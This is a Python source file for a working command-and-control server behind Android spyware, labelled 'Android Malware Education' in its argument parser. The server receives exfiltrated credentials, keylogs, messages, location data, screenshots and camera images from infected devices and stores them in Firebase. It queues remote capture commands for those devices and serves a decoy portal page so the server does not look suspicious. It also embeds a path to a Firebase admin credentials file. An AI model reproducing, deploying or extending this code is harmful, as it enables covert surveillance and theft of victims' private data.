import argparse
import base64
import datetime
import json
import logging
import os
import threading
import firebase_admin
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from firebase_admin import credentials
from firebase_admin import db
import zlib
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse
from utils import sanitize_key, sanitize_dict

# Configure logging
logging.basicConfig(
    level=logging.DEBUG,  # Change from INFO to DEBUG for more verbose output
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("c2_server.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("C2Server")

FIREBASE_CRED_FILE = "C:\\Users\\tanwm\\Desktop\\databse-7d740-firebase-adminsdk-fbsvc-7aba2c03f2.json"
# Constants
DEFAULT_PORT = 42069
# Use the directory where the script is located for data storage
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(SCRIPT_DIR, "harvested_data")

def initialize_firebase():
    if not os.path.exists(FIREBASE_CRED_FILE):
        logger.error(f"Firebase credentials file not found: {FIREBASE_CRED_FILE}")
        return False
    
    try:
        cred = credentials.Certificate(FIREBASE_CRED_FILE)
        firebase_admin.initialize_app(cred, {
            'databaseURL': 'https://databse-7d740-default-rtdb.asia-southeast1.firebasedatabase.app/'
        })
        logger.info("Firebase initialized successfully")
        return True
    except Exception as e:
        logger.error(f"Firebase initialization error: {str(e)}")
        return False
    
class C2RequestHandler(BaseHTTPRequestHandler):
    """
    HTTP Request handler for C2 server
    """

    def log_message(self, format, *args):
        """Override to use our custom logger instead of standard output"""
        logger.info("%s - %s", self.address_string(), format % args)

    def do_GET(self):
        """
        Handle GET requests - Process data requests or return fake website
        """
        # Parse URL path
        parsed_path = urlparse(self.path)
        path = parsed_path.path

        # Check if this is a data request from admin console
        if path.startswith('/data/'):
            # Extract the data type from the URL path
            data_type = path.split('/')[2]
            self._serve_data_listing(data_type)
            return

        # Default response - fake website
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

        # Send a fake website so if someone discovers the server, it doesn't look suspicious
        fake_site = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>System Administration</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { font-family: Arial, sans-serif; margin: 0; padding: 20px; }
                h1 { color: #444; }
                .container { max-width: 800px; margin: 0 auto; }
                .info { background: #f5f5f5; padding: 20px; border-radius: 5px; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>System Management Portal</h1>
                <div class="info">
                    <p>This is a system management portal. Access is restricted to authorized personnel.</p>
                    <p>Please contact your administrator for access credentials.</p>
                </div>
            </div>
        </body>
        </html>
        """
        self.wfile.write(fake_site.encode())

    def _serve_data_listing(self, data_type):
        """Serve data listing from Firebase for admin console"""
        try:
            # Get data from Firebase
            data_ref = db.reference('exfiltrated_data')
            all_data = data_ref.get() or {}

            # Process data for display
            entries = []
            for device_id, device_data in all_data.items():
                if not device_data:
                    continue

                for type_key, type_data in device_data.items():
                    if type_key != data_type:
                        continue

                    for entry_id, entry in type_data.items():
                        # Extract payload
                        if isinstance(entry, dict) and "payload" in entry:
                            payload = entry.get("payload", "{}")
                            timestamp = entry.get("timestamp", "unknown")

                            try:
                                # Parse JSON string from payload
                                payload_json = json.loads(payload)

                                # Process payload files
                                if "payload" in payload_json:
                                    decoded_files = {}
                                    for file_name, encoded_content in payload_json["payload"].items():
                                        decoded_content = self._decode_payload(encoded_content)
                                        decoded_files[file_name] = decoded_content

                                    # Replace encoded payload with decoded content
                                    payload_json["decoded_files"] = decoded_files

                                entries.append({
                                    "device_id": device_id,
                                    "timestamp": timestamp,
                                    "data": payload_json
                                })
                            except Exception as e:
                                logger.error(f"Error processing entry: {str(e)}")
                                entries.append({
                                    "device_id": device_id,
                                    "timestamp": timestamp,
                                    "error": f"Error processing data: {str(e)}",
                                    "raw_data": payload
                                })

            # Send the processed data
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps(entries).encode())
        except Exception as e:
            logger.error(f"Error serving data listing: {str(e)}")
            self.send_response(500)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"error": str(e)}).encode())

    def _decode_payload(self, encoded_data):
        """Decode and decrypt payload data"""
        try:
            # Decode base64
            decoded = base64.b64decode(encoded_data)

            # Extract IV (first 16 bytes) and ciphertext
            iv = decoded[:16]
            ciphertext = decoded[16:]

            # Decrypt AES using CBC mode with the extracted IV
            key = b"ThisIsAFakeKey16"  # Same key used in the Android app
            cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
            decryptor = cipher.decryptor()
            decrypted = decryptor.update(ciphertext) + decryptor.finalize()

            # Remove padding (PKCS7 padding)
            padding_length = decrypted[-1]
            if padding_length > 0 and padding_length <= 16:
                decrypted = decrypted[:-padding_length]

            # Convert to string
            result = decrypted.decode('utf-8')
            return result
        except Exception as e:
            logger.error(f"Error decoding payload: {str(e)}")

    def do_POST(self):
        """
        Handle POST requests containing exfiltrated data from the Android app
        """
        try:
            # Log detailed request information
            content_length = int(self.headers.get('Content-Length', 0))
            content_type = self.headers.get('Content-Type', 'unknown')
            client_ip = self.client_address[0]
            x_data_type = self.headers.get('X-Data-Type', 'none')
            x_device_id = self.headers.get('X-Device-ID', 'unknown')

            logger.debug(f"Received POST request from {client_ip} with content-type: {content_type}")
            logger.debug(f"Headers: {dict(self.headers)}")
            logger.debug(f"Content-Length: {content_length}, X-Data-Type: {x_data_type}, X-Device-ID: {x_device_id}")

            # Parse URL path
            parsed_path = urlparse(self.path)
            path = parsed_path.path
            logger.debug(f"Request path: {path}")

            # Handle different endpoint types, including API prefixed paths
            if path == "/exfil" or path == "/api/data" or path.startswith("/api/data/"):
                logger.debug("Processing exfil data request")
                self._handle_exfil_data()
            elif path == "/register" or path == "/api/register":
                logger.debug("Processing device registration request")
                self._handle_device_registration()
            elif path == "/command" or path == "/api/command":
                logger.debug("Processing command request")
                self._handle_command_request()
            elif path == "/api/analytics" or path == "/api/telemetry" or path == "/api/sync":
                # Handle other API endpoints that might be used for exfiltration
                logger.debug(f"Processing alternative exfil path: {path}")
                self._handle_analytics_data()
            elif path == "/api/auth/validate":
                # Special handling for credential validation
                logger.debug("Processing credential validation (auth) data")
                self._handle_exfil_data()
            else:
                # Respond with 404 for unrecognized paths to avoid exposing the server
                logger.warning(f"Unrecognized path requested: {path}")
                self.send_response(404)
                self.end_headers()

        except Exception as e:
            logger.error(f"Error handling POST request: {str(e)}")
            logger.exception("Full exception details:")
            self.send_response(500)
            self.end_headers()

    def _handle_exfil_data(self):
        """Handle incoming exfiltrated data"""
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)

        logger.debug(f"Received {content_length} bytes of exfil data")

        try:
            # Try to decompress if data is compressed
            try:
                decompressed_data = zlib.decompress(post_data)
                data = decompressed_data
                logger.debug("Successfully decompressed zlib data")
            except Exception as decomp_error:
                logger.debug(f"Data is not compressed or decompression failed: {str(decomp_error)}")
                data = post_data

            # Try to decode JSON
            try:
                logger.debug("Attempting to parse as JSON...")
                decoded_data = data.decode('utf-8')
                logger.debug(f"First 200 chars of data: {decoded_data[:200]}...")

                json_data = json.loads(decoded_data)
                # Log successful receipt of data
                logger.info(f"Received data type: {json_data.get('type', 'unknown')}")

                # Save the data to Firebase
                self._save_received_data(json_data)

                # Respond with success
                self.send_response(200)
                self.send_header("Content-type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps({"status": "success", "message": "Data received"}).encode())

            except json.JSONDecodeError as json_error:
                logger.warning(f"JSON decode error: {str(json_error)}")
                # If not JSON, handle as binary data (like camera images)
                if self.headers.get('X-Data-Type') == 'camera_image':
                    logger.debug("Handling as camera image data")
                    # Handle camera image data as base64 string for Firebase
                    timestamp = datetime.datetime.now().isoformat()
                    device_id = self.headers.get('X-Device-ID', 'unknown_device')

                    # Store binary data as base64 in Firebase
                    firebase_ref = db.reference(f'exfiltrated_data/{device_id}/camera')
                    firebase_ref.push().set({
                        "timestamp": timestamp,
                        "data": base64.b64encode(data).decode('utf-8')
                    })

                    logger.info(f"Saved camera image to Firebase for device {device_id}")

                    # Respond with success
                    self.send_response(200)
                    self.send_header("Content-type", "application/json")
                    self.end_headers()
                    self.wfile.write(json.dumps({"status": "success", "message": "Image received"}).encode())
                else:
                    # Handle unknown binary data
                    logger.debug("Handling as unknown binary data")
                    timestamp = datetime.datetime.now().isoformat()
                    device_id = self.headers.get('X-Device-ID', 'unknown_device')
                    data_type = self.headers.get('X-Data-Type', 'unknown')

                    # Store binary data as base64 in Firebase
                    firebase_ref = db.reference(f'exfiltrated_data/{device_id}/{data_type}')
                    firebase_ref.push().set({
                        "timestamp": timestamp,
                        "data": base64.b64encode(data).decode('utf-8')
                    })

                    logger.info(f"Saved binary data to Firebase for device {device_id}")

                    # Respond with success
                    self.send_response(200)
                    self.send_header("Content-type", "application/json")
                    self.end_headers()
                    self.wfile.write(json.dumps({"status": "success", "message": "Binary data received"}).encode())

        except Exception as e:
            logger.error(f"Error processing exfiltrated data: {str(e)}")
            logger.exception("Full exception details:")
            self.send_response(400)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"status": "error", "message": str(e)}).encode())

    def _handle_device_registration(self):
        """Handle device registration requests and save to Firebase"""
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)

        try:
            data = json.loads(post_data.decode('utf-8'))
            device_id = data.get('device_id')
            device_info = data.get('device_info', {})

            logger.info(f"Device registration: {device_id}")

            # Save to Firebase
            device_ref = db.reference(f'devices/{device_id}')

            device_data = {
                "device_id": device_id,
                "device_info": device_info,
                "registration_time": datetime.datetime.now().isoformat(),
                "last_seen": datetime.datetime.now().isoformat()
            }

            device_ref.set(device_data)

            # Initialize command node in Firebase if it doesn't exist
            command_ref = db.reference(f'commands/{device_id}')
            command_data = {"pending": [], "executed": []}

            # Only set if it doesn't exist
            if not command_ref.get():
                command_ref.set(command_data)

            # Respond with success and initial commands
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()

            # Send initial commands to the device
            self.wfile.write(json.dumps({
                "status": "success",
                "device_id": device_id,
                "commands": [
                    {"command": "set_interval", "interval": 15},  # Set upload interval to 15 minutes
                    {"command": "collect_info"}  # Request basic device info
                ]
            }).encode())

        except Exception as e:
            logger.error(f"Error processing device registration: {str(e)}")
            self.send_response(400)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"status": "error", "message": str(e)}).encode())

    def _handle_command_request(self):
        """Handle command requests from devices"""
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)

        try:
            data = json.loads(post_data.decode('utf-8'))
            device_id = data.get('device_id')

            # Update last seen time
            self._update_device_last_seen(device_id)

            logger.info(f"Command request from device: {device_id}")

            # Check if there are pending commands for this device
            commands = self._get_pending_commands(device_id)

            # Respond with commands
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({
                "status": "success",
                "commands": commands
            }).encode())

        except Exception as e:
            logger.error(f"Error processing command request: {str(e)}")
            self.send_response(400)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"status": "error", "message": str(e)}).encode())

    def _save_received_data(self, json_data):
        """Save received JSON data to Firebase"""
        data_type = json_data.get('type', 'unknown')
        device_id = json_data.get('device_id', 'unknown_device')
        timestamp = datetime.datetime.now().isoformat()

        try:
            # Create reference to Firebase location
            firebase_ref = db.reference(f'exfiltrated_data/{device_id}/{data_type}')

            # Add timestamp to the data
            json_data['received_timestamp'] = timestamp

            # Push data to Firebase (generates unique key)
            # Convert the entire payload to string to avoid key validation issues
            firebase_ref.push().set({
                "timestamp": timestamp,
                "metadata": {
                    "source": "android_device",
                    "dataType": data_type,
                    "deviceId": device_id
                },
                "payload": json.dumps(json_data)  # Store as string to avoid key validation issues
            })

            logger.info(f"Saved {data_type} data to Firebase for device {device_id}")
        except Exception as e:
            logger.error(f"Error saving data to Firebase: {str(e)}")


    def _update_device_last_seen(self, device_id):
        """Update the last seen timestamp for a device in Firebase"""
        if not device_id or device_id == "unknown_device":
            return

        try:
            # Update in Firebase
            devices_ref = db.reference(f'devices/{device_id}')

            # Get current data if it exists
            device_data = devices_ref.get()

            if device_data:
                # Update last seen
                devices_ref.update({
                    "last_seen": datetime.datetime.now().isoformat()
                })
            else:
                # Create a new device entry
                device_data = {
                    "device_id": device_id,
                    "device_info": {},
                    "registration_time": datetime.datetime.now().isoformat(),
                    "last_seen": datetime.datetime.now().isoformat()
                }
                devices_ref.set(device_data)

            logger.info(f"Updated device last seen in Firebase: {device_id}")
        except Exception as e:
            logger.error(f"Error updating device in Firebase: {str(e)}")

    def _get_pending_commands(self, device_id):
        """Get pending commands for a device from Firebase"""
        try:
            # Get commands from Firebase
            command_ref = db.reference(f'commands/{device_id}')
            commands_data = command_ref.get() or {"pending": [], "executed": []}

            # Get pending commands
            pending_commands = commands_data.get("pending", [])

            # Move pending commands to executed
            executed_commands = commands_data.get("executed", [])
            for cmd in pending_commands:
                cmd["executed_at"] = datetime.datetime.now().isoformat()
                executed_commands.append(cmd)

            # Update Firebase
            command_ref.update({
                "pending": [],
                "executed": executed_commands
            })

            return pending_commands

        except Exception as e:
            logger.error(f"Error getting pending commands: {str(e)}")
            return []

    def _handle_analytics_data(self):
        """Handle incoming analytics data from the app"""
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)

        logger.debug(f"Received {content_length} bytes of analytics data")

        try:
            # Parse the JSON directly since analytics data is usually not compressed
            data = json.loads(post_data.decode('utf-8'))

            # Sanitize keys in the analytics data
            data = sanitize_dict(data)

            # Add metadata
            data['received_at'] = datetime.datetime.now().isoformat()
            data['client_ip'] = self.client_address[0]

            # Save to Firebase
            client_id = self.headers.get('X-Client-ID', 'unknown')
            analytics_ref = db.reference(f'analytics/{client_id}')
            analytics_ref.push().set(data)

            logger.info(f"Saved analytics data for client {client_id}")

            # Return success
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"status": "success", "message": "Analytics received"}).encode())
        except Exception as e:
            logger.error(f"Error processing analytics data: {str(e)}")
            self.send_response(400)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"status": "error", "message": str(e)}).encode())


class CommandManager:
    """
    Manage commands for connected devices using Firebase
    """

    def add_command(self, device_id, command_data):
        """Add a command for a device to Firebase"""
        try:
            # Create reference to Firebase location
            command_ref = db.reference(f'commands/{device_id}')

            # Get existing commands
            commands_data = command_ref.get() or {"pending": [], "executed": []}

            # Add timestamp to command
            command_data["created_at"] = datetime.datetime.now().isoformat()

            # Add command to pending list
            pending_commands = commands_data.get("pending", [])
            pending_commands.append(command_data)

            # Update Firebase
            command_ref.update({
                "pending": pending_commands
            })

            logger.info(f"Added command to device {device_id}: {command_data}")
            return True
        except Exception as e:
            logger.error(f"Error adding command to Firebase: {str(e)}")
            return False

    def get_devices(self):
        """Get list of registered devices from Firebase"""
        try:
            # Get devices from Firebase
            devices_ref = db.reference('devices')
            devices_data = devices_ref.get() or {}

            # Convert to list
            devices = []
            for device_id, device_data in devices_data.items():
                device_data['device_id'] = device_id
                devices.append(device_data)

            return devices
        except Exception as e:
            logger.error(f"Error getting devices from Firebase: {str(e)}")
            return []


class WebAdminConsole:
    """
    Web-based admin console for interacting with the C2 server
    """
    
    def __init__(self, port=8080):
        self.port = port
        self.command_manager = CommandManager()
        self.server = None
        self.server_thread = None
    
    def start(self):
        """Start the web admin console"""
        class AdminRequestHandler(BaseHTTPRequestHandler):
            def log_message(self, format, *args):
                logger.info("%s - %s", self.address_string(), format % args)
            
            def do_GET(self):
                if self.path == "/":
                    self.send_response(200)
                    self.send_header("Content-type", "text/html")
                    self.end_headers()
                    self.wfile.write(self._get_dashboard_html().encode())
                elif self.path == "/devices":
                    self.send_response(200)
                    self.send_header("Content-type", "application/json")
                    self.end_headers()
                    self.wfile.write(json.dumps(self.server.command_manager.get_devices()).encode())
                elif self.path.startswith("/data/"):
                    data_type = self.path.split("/")[2]
                    self._serve_data_listing(data_type)
                else:
                    self.send_response(404)
                    self.end_headers()
            
            def do_POST(self):
                if self.path == "/command":
                    content_length = int(self.headers['Content-Length'])
                    post_data = self.rfile.read(content_length)
                    data = json.loads(post_data.decode('utf-8'))
                    
                    device_id = data.get('device_id')
                    command = data.get('command')
                    
                    if not device_id or not command:
                        self.send_response(400)
                        self.send_header("Content-type", "application/json")
                        self.end_headers()
                        self.wfile.write(json.dumps({"status": "error", "message": "Missing device_id or command"}).encode())
                        return
                    
                    # Create commands directory if it doesn't exist
                    commands_dir = os.path.join(DATA_DIR, "commands")
                    os.makedirs(commands_dir, exist_ok=True)
                    
                    success = self.server.command_manager.add_command(device_id, command)
                    
                    self.send_response(200)
                    self.send_header("Content-type", "application/json")
                    self.end_headers()
                    self.wfile.write(json.dumps({"status": "success" if success else "error"}).encode())
                else:
                    self.send_response(404)
                    self.end_headers()

            def _serve_data_listing(self, data_type):
                """Serve data listing from Firebase for admin console"""
                try:
                    # Get data from Firebase
                    data_ref = db.reference('exfiltrated_data')
                    all_data = data_ref.get() or {}

                    # Process data for the requested type
                    files = []
                    for device_id, device_data in all_data.items():
                        if not device_data:
                            continue

                        for type_key, type_data in device_data.items():
                            if data_type != 'all' and type_key != data_type:
                                continue

                            for entry_id, entry in type_data.items():
                                files.append({
                                    "device_id": device_id,
                                    "data_type": type_key,
                                    "entry_id": entry_id,
                                    "timestamp": entry.get("timestamp", "unknown"),
                                    "data": entry
                                })

                    self.send_response(200)
                    self.send_header("Content-type", "application/json")
                    self.end_headers()
                    self.wfile.write(json.dumps(files).encode())
                except Exception as e:
                    logger.error(f"Error serving data listing: {str(e)}")
                    self.send_response(500)
                    self.send_header("Content-type", "application/json")
                    self.end_headers()
                    self.wfile.write(json.dumps({"error": str(e)}).encode())

            def _get_dashboard_html(self):
                return """
                <!DOCTYPE html>
                <html>
                <head>
                    <title>C2 Server Admin Console</title>
                    <meta name="viewport" content="width=device-width, initial-scale=1">
                    <style>
                        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; }
                        h1, h2 { color: #444; }
                        .container { max-width: 1200px; margin: 0 auto; }
                        .panel { background: #f5f5f5; padding: 20px; border-radius: 5px; margin-bottom: 20px; }
                        .device-card { background: white; border: 1px solid #ddd; padding: 15px; margin-bottom: 10px; border-radius: 5px; }
                        .device-controls { margin-top: 10px; }
                        button { background: #4CAF50; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; }
                        button:hover { background: #45a049; }
                        .data-types { display: flex; flex-wrap: wrap; gap: 10px; margin-top: 20px; }
                        .data-type { background: #2196F3; color: white; padding: 8px 16px; border-radius: 4px; cursor: pointer; }
                        #data-viewer { background: white; border: 1px solid #ddd; padding: 15px; border-radius: 5px; margin-top: 20px; max-height: 500px; overflow: auto; }
                        pre { margin: 0; white-space: pre-wrap; }
                    </style>
                </head>
                <body>
                    <div class="container">
                        <h1>C2 Server Admin Console</h1>
                        
                        <div class="panel">
                            <h2>Connected Devices</h2>
                            <div id="devices-list">Loading devices...</div>
                        </div>
                        
                        <div class="panel">
                            <h2>Harvested Data</h2>
                            <div class="data-types">
                                <div class="data-type" onclick="loadData('credentials')">Credentials</div>
                                <div class="data-type" onclick="loadData('keylog')">Keylog Data</div>
                                <div class="data-type" onclick="loadData('location')">Location Data</div>
                                <div class="data-type" onclick="loadData('messages')">Messages</div>
                                <div class="data-type" onclick="loadData('screenshots')">Screenshots</div>
                            </div>
                            <div id="data-viewer">Select a data type to view</div>
                        </div>
                    </div>
                    
                    <script>
                        // Load devices
                        function loadDevices() {
                            fetch('/devices')
                                .then(response => response.json())
                                .then(data => {
                                    const devicesDiv = document.getElementById('devices-list');
                                    if (data.length === 0) {
                                        devicesDiv.innerHTML = '<p>No devices registered yet.</p>';
                                        return;
                                    }
                                    
                                    let html = '';
                                    data.forEach(device => {
                                        html += `
                                            <div class="device-card">
                                                <h3>Device ID: ${device.device_id}</h3>
                                                <p>Registration Time: ${device.registration_time}</p>
                                                <p>Last Seen: ${device.last_seen}</p>
                                                <div class="device-info">
                                                    <p>Device Model: ${device.device_info.model || 'Unknown'}</p>
                                                    <p>Android Version: ${device.device_info.android_version || 'Unknown'}</p>
                                                </div>
                                                <div class="device-controls">
                                                    <button onclick="sendCommand('${device.device_id}', 'collect_info')">Collect Device Info</button>
                                                    <button onclick="sendCommand('${device.device_id}', 'capture_screenshot')">Capture Screenshot</button>
                                                    <button onclick="sendCommand('${device.device_id}', 'capture_camera')">Capture Camera</button>
                                                    <button onclick="sendCommand('${device.device_id}', 'get_location')">Get Location</button>

                                                </div>
                                            </div>
                                        `;
                                    });
                                    
                                    devicesDiv.innerHTML = html;
                                })
                                .catch(error => {
                                    console.error('Error loading devices:', error);
                                    document.getElementById('devices-list').innerHTML = '<p>Error loading devices.</p>';
                                });
                        }
                        
                        // Send command to device
                        function sendCommand(deviceId, commandType) {
                            const commandData = { command: commandType };
                            
                            fetch('/command', {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json'
                                },
                                body: JSON.stringify({
                                    device_id: deviceId,
                                    command: commandData
                                })
                            })
                                .then(response => response.json())
                                .then(data => {
                                    if (data.status === 'success') {
                                        alert(`Command "${commandType}" sent to device ${deviceId}`);
                                    } else {
                                        alert(`Error sending command: ${data.message || 'Unknown error'}`);
                                    }
                                })
                                .catch(error => {
                                    console.error('Error sending command:', error);
                                    alert('Error sending command. See console for details.');
                                });
                        }
                        
                        // Load data of specific type
                        function loadData(dataType) {
                            fetch(`/data/${dataType}`)
                                .then(response => response.json())
                                .then(data => {
                                    const dataViewer = document.getElementById('data-viewer');
                                    if (data.length === 0) {
                                        dataViewer.innerHTML = `<p>No data of type "${dataType}" available.</p>`;
                                        return;
                                    }
                                    
                                    let html = `<h3>${dataType} Data (${data.length} entries)</h3>`;
                                    
                                    data.forEach(item => {
                                        html += `
                                            <div style="border-bottom: 1px solid #ddd; padding-bottom: 10px; margin-bottom: 10px;">
                                                <p><strong>Device ID:</strong> ${item.device_id}</p>
                                                <p><strong>Timestamp:</strong> ${item.timestamp}</p>`;
                                        
                                        if (item.error) {
                                            html += `<p style="color: red"><strong>Error:</strong> ${item.error}</p>`;
                                            if (item.raw_data) {
                                                html += `<p><strong>Raw Data:</strong></p><pre>${item.raw_data}</pre>`;
                                            }
                                        } else if (item.data) {
                                            // Display decoded files if available
                                            if (item.data.decoded_files) {
                                                html += `<p><strong>Decoded Files:</strong></p>`;
                                                for (const [fileName, content] of Object.entries(item.data.decoded_files)) {
                                                    html += `
                                                        <div style="margin-left: 20px; margin-bottom: 10px;">
                                                            <p><strong>${fileName}</strong></p>
                                                            <pre style="background: #f5f5f5; padding: 10px; border-radius: 4px;">${content}</pre>
                                                        </div>`;
                                                }
                                            }
                                            
                                            // Display other data fields
                                            html += `<p><strong>Full Data:</strong></p>
                                                 <pre>${JSON.stringify(item.data, null, 2)}</pre>`;
                                        }
                                        
                                        html += `</div>`;
                                    });
                                    
                                    dataViewer.innerHTML = html;
                                })
                                .catch(error => {
                                    console.error(`Error loading ${dataType} data:`, error);
                                    document.getElementById('data-viewer').innerHTML = `<p>Error loading ${dataType} data.</p>`;
                                });
                        }
                        
                        // Initial load
                        document.addEventListener('DOMContentLoaded', function() {
                            loadDevices();
                            
                            // Refresh devices every 30 seconds
                            setInterval(loadDevices, 30000);
                        });
                    </script>
                </body>
                </html>
                """
        
        # Create server
        self.server = HTTPServer(('localhost', self.port), AdminRequestHandler)
        self.server.command_manager = self.command_manager
        
        # Start server in a separate thread
        self.server_thread = threading.Thread(target=self._run_server)
        self.server_thread.daemon = True
        self.server_thread.start()
        
        logger.info(f"Admin console running at http://localhost:{self.port}")
    
    def _run_server(self):
        self.server.serve_forever()
    
    def stop(self):
        """Stop the web admin console"""
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            logger.info("Admin console stopped")


def run_c2_server(port):
    """Run the C2 server with Firebase integration"""
    # Initialize Firebase
    if not initialize_firebase():
        logger.error("Failed to initialize Firebase, exiting.")
        return

    # Create HTTPS server
    httpd = HTTPServer(('0.0.0.0', port), C2RequestHandler)

    # Start admin console
    admin_console = WebAdminConsole()
    admin_console.start()

    try:
        # Run server
        logger.info(f"C2 server running on port {port}")
        httpd.serve_forever()
    except KeyboardInterrupt:
        logger.info("Server shutting down...")
    finally:
        httpd.server_close()
        admin_console.stop()


if __name__ == "__main__":
    # Parse command line arguments
    parser = argparse.ArgumentParser(description="C2 Server for Android Malware Education")
    parser.add_argument("--port", type=int, default=DEFAULT_PORT, help=f"Port to listen on (default: {DEFAULT_PORT})")
    parser.add_argument("--no-ssl", action="store_true", help="Disable SSL (not recommended)")
    
    args = parser.parse_args()
    
    # Run server
    run_c2_server(args.port)